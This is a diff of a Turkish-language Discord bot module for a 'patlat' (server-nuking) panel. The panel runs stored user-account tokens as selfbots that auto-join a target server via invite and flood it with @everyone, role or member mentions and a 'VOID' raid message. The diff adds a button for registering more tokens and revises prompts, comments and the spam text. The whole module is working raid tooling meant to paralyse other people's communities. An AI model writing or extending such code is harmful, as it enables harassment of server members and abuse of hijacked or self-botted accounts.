@@ -24,11 +24,12 @@ async function renderPatlatPanel(userId) {
             'Hesaplarınız hedef sunucuya sızar, yavaş modu hesaplar. Everyone izni yoksa rolleri, o da yoksa üyeleri etiketleyerek sunucuyu felç eder.\n\n' +
             `<a:emoji110:1537925433763299418> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
             `<a:emoji110:1537925433763299418> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
-            '<a:emoji24:1537925080447717447> *Önce hesap seçin, ardından Başlat butonuna tıklayın.*'
+            '<a:emoji24:1537925080447717447> *Aşağıdaki butonları kullanarak paneli yönetin.*'
         );
 
-    // Tam istediğin gibi sade, emojisiz, standart Void butonu tasarımı
+    // Butonlar karmaşıklıktan kurtarıldı, yan yana kompakt hale getirildi.
     const row1 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('btn_patlat_yeni_token').setLabel('Yeni Token Ekle').setStyle(ButtonStyle.Secondary),
         new ButtonBuilder().setCustomId('tk_patlat_sec').setLabel('Hesap Seç').setStyle(ButtonStyle.Primary),
         new ButtonBuilder().setCustomId('tk_patlat_hepsi').setLabel('Tüm Hesapları Seç').setStyle(ButtonStyle.Secondary)
     );
@@ -62,6 +63,11 @@ module.exports = {
             return i.editReply(await renderPatlatPanel(i.user.id));
         }
 
+        // ================= YENİ TOKEN EKLE YÖNLENDİRMESİ =================
+        if (id === 'btn_patlat_yeni_token') {
+            return i.reply({ content: '<a:emoji110:1537925433763299418> Lütfen sisteme yeni hesap eklemek için <#1537974081461297162> kanalını kullanın.', flags: 64 });
+        }
+
         // ================= SEÇİM İŞLEMLERİ =================
         if (id === 'tk_patlat_hepsi') {
             const userAccounts = await Account.find({ userId: i.user.id });
@@ -90,7 +96,7 @@ module.exports = {
         if (id === 'tk_patlat_baslat') {
             const sessionData = tempNukeSession.get(i.user.id);
             if (!sessionData || sessionData.tokens.length === 0) {
-                return i.reply({ content: '<a:emoji197:1537925769068806214> Önce **Hesap Seç** butonunu kullanarak işlem yapılacak hesapları belirleyin.', flags: 64 });
+                return i.reply({ content: '<a:emoji197:1537925769068806214> Önce **Hesap Seç** veya **Tüm Hesapları Seç** butonunu kullanarak işlem yapılacak hesapları belirleyin.', flags: 64 });
             }
 
             const modal = new ModalBuilder().setCustomId('modal_patlat_baslat').setTitle('Hedef Sunucu Ayarları');
@@ -103,7 +109,6 @@ module.exports = {
             await i.deferUpdate().catch(()=>{});
             let inviteInput = i.fields.getTextInputValue('g_invite');
             
-            // Link girildiyse sadece kodu ayıkla
             let inviteCode = inviteInput.replace('https://discord.gg/', '').replace('discord.gg/', '').replace('https://discord.com/invite/', '');
 
             const sessionData = tempNukeSession.get(i.user.id);
@@ -118,27 +123,24 @@ module.exports = {
                     const selfBot = new SelfbotClient({ checkUpdate: false });
                     
                     selfBot.on('ready', async () => {
-                        let targetGuildId = inviteCode; // Varsayılan olarak direkt ID girildiyse diye
+                        let targetGuildId = inviteCode; 
 
-                        // BOTA OTOMATİK SUNUCUYA GİRİŞ YAPTIRMA AŞAMASI
                         try {
                             const inviteData = await selfBot.fetchInvite(inviteCode);
                             if (inviteData && inviteData.guild) {
                                 targetGuildId = inviteData.guild.id;
                                 await selfBot.acceptInvite(inviteCode);
-                                await new Promise(r => setTimeout(r, 2500)); // Katılması için 2.5 sn bekle
+                                await new Promise(r => setTimeout(r, 2500)); 
                             }
-                        } catch (err) {
-                            // Davet geçersizse veya hesap zaten içerideyken ID girildiyse buraya düşer, devam eder.
-                        }
+                        } catch (err) {}
 
                         const guild = selfBot.guilds.cache.get(targetGuildId);
                         if (!guild) {
                             selfBot.destroy();
-                            return; // Sunucu bulunamadıysa arka planda açık kalmaması için botu kapat
+                            return; 
                         }
 
-                        // DOĞRU LOG SİSTEMİ
+                        // DOĞRU VE EMOJİSİZ LOG SİSTEMİ
                         const logChannel = i.client.channels.cache.get(LOG_CHANNEL_ID);
                         if (logChannel) {
                             const logEmbed = new EmbedBuilder()
@@ -171,7 +173,7 @@ module.exports = {
 
                             let spamText = "";
                             
-                            // Emojisiz, standart Void patlatma yazısı
+                            // Tamamen Void Emojili Metinler
                             if (canEveryone) {
                                 spamText = "@everyone @here <a:emoji58:1537925046486433802> **VOID GELDİ, SUNUCU PATLIYOR! KAÇIN!** <a:emoji24:1537925080447717447>";
                             } else {
